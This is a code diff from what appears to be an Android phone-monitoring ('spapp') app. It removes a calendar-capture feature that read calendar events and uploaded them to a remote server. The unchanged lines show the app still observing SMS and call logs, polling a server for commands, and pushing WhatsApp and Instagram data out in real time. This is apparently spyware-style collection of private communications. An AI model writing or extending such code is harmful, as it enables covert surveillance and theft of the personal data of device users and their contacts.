@@ -8,14 +8,12 @@ import android.net.Uri
 import android.os.Handler
 import android.os.Looper
 import android.provider.CallLog
-import android.provider.CalendarContract
 import android.provider.Telephony
 import android.util.Log
 import androidx.core.content.ContextCompat
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.network.ApiClient
-import com.spapp.monitoring.network.CalendarSyncRequest
 import com.spapp.monitoring.network.CallLogEntryDto
 import com.spapp.monitoring.network.CallLogSyncRequest
 import com.spapp.monitoring.network.SmsLogEntryDto
@@ -63,11 +61,6 @@ object RealtimeLogObserverManager {
     private var callJob: Job? = null
     private val callMutex = Mutex()
 
-    private var calendarObserver: ContentObserver? = null
-    private var isCalendarRegistered = false
-    private var calendarJob: Job? = null
-    private val calendarMutex = Mutex()
-
     private var whatsAppJob: Job? = null
     private val whatsAppMutex = Mutex()
 
@@ -82,7 +75,6 @@ object RealtimeLogObserverManager {
         val appCtx = context.applicationContext
         startSmsObserver(appCtx)
         startCallObserver(appCtx)
-        startCalendarObserver(appCtx)
         startCommandPoller(appCtx)
         triggerInstantWhatsAppUpload(appCtx)
     }
@@ -110,17 +102,6 @@ object RealtimeLogObserverManager {
             isCallRegistered = false
             callJob?.cancel()
             callJob = null
-        }
-
-        try {
-            calendarObserver?.let { appCtx.contentResolver.unregisterContentObserver(it) }
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to unregister Calendar observer", e)
-        } finally {
-            calendarObserver = null
-            isCalendarRegistered = false
-            calendarJob?.cancel()
-            calendarJob = null
         }
 
         whatsAppJob?.cancel()
@@ -228,35 +209,6 @@ object RealtimeLogObserverManager {
             triggerCallCapture(appCtx)
         } catch (e: Exception) {
             Log.e(TAG, "Failed to register Call ContentObserver", e)
-        }
-    }
-
-    private fun startCalendarObserver(appCtx: Context) {
-        if (isCalendarRegistered) return
-        if (ContextCompat.checkSelfPermission(appCtx, Manifest.permission.READ_CALENDAR) != PackageManager.PERMISSION_GRANTED) {
-            return
-        }
-
-        try {
-            val obs = object : ContentObserver(Handler(Looper.getMainLooper())) {
-                override fun onChange(selfChange: Boolean, uri: Uri?) {
-                    super.onChange(selfChange, uri)
-                    triggerCalendarCapture(appCtx)
-                }
-            }
-            appCtx.contentResolver.registerContentObserver(
-                CalendarContract.Events.CONTENT_URI,
-                true,
-                obs
-            )
-            calendarObserver = obs
-            isCalendarRegistered = true
-            Log.d(TAG, "Calendar ContentObserver registered")
-
-            // Initial capture on startup
-            triggerCalendarCapture(appCtx)
-        } catch (e: Exception) {
-            Log.e(TAG, "Failed to register Calendar ContentObserver", e)
         }
     }
 
@@ -446,38 +398,6 @@ object RealtimeLogObserverManager {
                 Unit
             } catch (e: Exception) {
                 Log.e(TAG, "Error in real-time Instagram upload", e)
-            }
-        }
-    }
-
-    fun triggerCalendarCapture(context: Context) {
-        synchronized(this) {
-            calendarJob?.cancel()
-            calendarJob = scope.launch {
-                delay(500)
-                captureCalendar(context)
-            }
-        }
-    }
-
-    private suspend fun captureCalendar(context: Context) {
-        calendarMutex.withLock {
-            try {
-                val state = DeviceState(context)
-                val authToken = state.authToken ?: return
-                val bearer = "Bearer $authToken"
-                val collector = CalendarCollector(context)
-                if (!collector.hasPermission()) return
-                val events = collector.collectAll()
-                if (events.isNotEmpty()) {
-                    val response = ApiClient.service.syncCalendar(bearer, CalendarSyncRequest(events))
-                    if (response.isSuccessful) {
-                        Log.d(TAG, "Instantly uploaded ${events.size} calendar events to server")
-                    }
-                }
-                Unit
-            } catch (e: Exception) {
-                Log.e(TAG, "Error in real-time Calendar upload", e)
             }
         }
     }
